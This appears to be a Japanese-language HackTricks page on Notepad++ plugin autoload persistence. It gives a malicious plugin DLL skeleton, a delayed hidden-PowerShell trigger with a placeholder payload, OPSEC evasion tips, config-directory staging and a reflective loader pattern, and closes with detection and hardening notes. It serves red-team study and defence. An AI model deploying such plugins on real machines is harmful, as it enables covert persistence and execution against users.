# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ は起動時に、`plugins` サブフォルダー内にあるすべての plugin DLL を **autoload** します。悪意のある plugin を **書き込み可能な Notepad++ installation** に配置すると、エディターを起動するたびに `notepad++.exe` 内で code execution が発生します。これは **persistence**、ステルス性の高い **initial execution**、またはエディターが elevated 権限で起動された場合の **in-process loader** として悪用できます。<sup>[[1]](#references)</sup>

**Notepad++ 7.6+** では、想定される手動インストールのレイアウトは、plugin ごとに 1 つのサブフォルダーを作成する形式です（`plugins\<PluginName>\<PluginName>.dll`）。**portable mode**（`notepad++.exe` と同じ場所に `doLocalConf.xml` が存在する場合）では、アプリケーション全体のツリーがそのディレクトリ内に保持されます。そのため、コピーされた admin tool bundles が、ユーザーによる書き込みが可能な execution surface になっていることがよくあります。<sup>[[2]](#references)</sup>

## 書き込み可能な plugin の場所

- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll`（通常は書き込みに admin 権限が必要）。<sup>[[1]](#references)</sup>
- 低権限の operator が利用できる書き込み可能な選択肢:<sup>[[1]](#references)</sup>
- **portable Notepad++ build** をユーザーが書き込み可能なフォルダーで使用する。
- `C:\Program Files\Notepad++` をユーザーが管理するパス（例: `%LOCALAPPDATA%\npp\`）にコピーし、そこから `notepad++.exe` を実行する。
- `doLocalConf.xml` をすでに含み、`Program Files` の外部に存在する **admin tool bundles**、展開済みの zip コピー、または help-desk toolkit を探す。
- 各 plugin は `plugins` の下に専用のサブフォルダーを持ち、startup 時に自動的にロードされます。メニュー項目は **Plugins** の下に表示されます。<sup>[[2]](#references)</sup>

簡易トリアージ:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Plugin load points（execution primitives）
Notepad++ は特定の **exported functions** を必要とします。これらはすべて initialization 中に呼び出されるため、複数の execution surface となります：<sup>[[1]](#references)</sup>
- **`DllMain`** — DLL load 時に即座に実行されます（最初の execution point）。
- **`setInfo(NppData)`** — load 時に一度呼び出され、Notepad++ の handles が渡されます。通常、menu items の登録に使用します。
- **`getName()`** — menu に表示される plugin name を返します。
- **`getFuncsArray(int *nbF)`** — menu commands を返します。空の場合でも startup 中に呼び出されます。
- **`beNotified(SCNotification*)`** — Notepad++ / Scintilla events を受け取ります（user action または editor event まで payloads を defer する場合に便利です）。
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler であり、大きなデータ交換に便利です。
- **`isUnicode()`** — load 時に確認される compatibility flag です。

ほとんどの exports は **stubs** として実装できます。autoload 中は、`DllMain` または上記のいずれかの callback から execution を発生させられます。

## 最小限の malicious plugin skeleton
想定される exports を備えた DLL を compile し、書き込み可能な Notepad++ folder 配下の `plugins\\MyNewPlugin\\MyNewPlugin.dll` に配置します：<sup>[[1]](#references)</sup>
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. DLL をビルドする（Visual Studio/MinGW）。
2. `plugins` 配下に plugin 用サブフォルダーを作成し、その中に DLL を配置する。
3. Notepad++ を再起動する。DLL が自動的にロードされ、`DllMain` と後続の callbacks が実行される。

## `beNotified` による低ノイズな trigger pattern
OPSEC のため、多くの payloads は **`DllMain` から fire させるべきではありません**。より静かな pattern では、plugin を正常にロードさせた後、**startup complete**、**buffer activation**、または **first typed character** など、現実的な editor event の発生後にのみ実行します。
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
これは、ノイズの多い `DllMain` beacon よりも public offensive research に適しています。DLL は startup 時に autoload されますが、malicious action は Notepad++ が実際に使用中であることが明確になるまで遅延されます。

## plugin config directory を secondary storage として使用する
Notepad++ は `NPPM_GETPLUGINSCONFIGDIR` を公開しており、**current user's plugin configuration directory** を返します。<sup>[[3]](#references)</sup> malicious plugin はこれを使用して、on-disk DLL を最小限に保ちながら、encrypted config、staged payloads、または tasking files を、通常の plugin state に紛れ込む path に保存できます。
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operationally、これは次のような場合に有用です:
- 小型のautoloaded bootstrap DLLが必要な場合;
- メインのplugin binaryに再度触れることなく、per-user taskingを行いたい場合;
- **autoload trigger**と、より大規模なsecond stageを分離したい場合。

## Reflective loader plugin pattern
weaponized pluginは、Notepad++を**reflective DLL loader**に変えることができます:<sup>[[1]](#references)</sup>
- 最小限のUI/menu entry（例: "LoadDLL"）を表示する。
- payload DLLを取得するための**file path**または**URL**を受け付ける。
- DLLをcurrent processにreflectively mapし、exported entry point（取得したDLL内のloader functionなど）を呼び出す。
- 利点: 新しいloaderをspawnする代わりに、無害に見えるGUI processを再利用できる。payloadは`notepad++.exe`のintegrity（elevated contextsを含む）を継承する。
- Trade-offs: **unsigned plugin DLL**をdiskにdropすると目立つ。実用的なvariationとして、autoloaded pluginはstubとしてのみ使用し、real implantは別の場所でencrypted/stagedにしておく方法がある。

## Detection and hardening notes
- **Notepad++ plugin directories**へのwrites（user profiles内のportable copiesを含む）をblockまたはmonitorする。controlled folder accessまたはapplication allowlistingを有効にする。
- `plugins`配下の**new unsigned DLLs**、portable Notepad++ treesへの変更、および`notepad++.exe`からの通常と異なる**child processes/network activity**をalertする。
- 正規pluginをbaseline化し、通常のNotepad++ plugin interfaceをexportしながら、shell、PowerShell、またはnetwork beaconsもspawnする新しいDLLを調査する。
- plugin installationは**Plugins Admin**経由のみに強制し、untrusted pathsからのportable copiesのexecutionを制限する。

## References

- [1] [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [3] [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
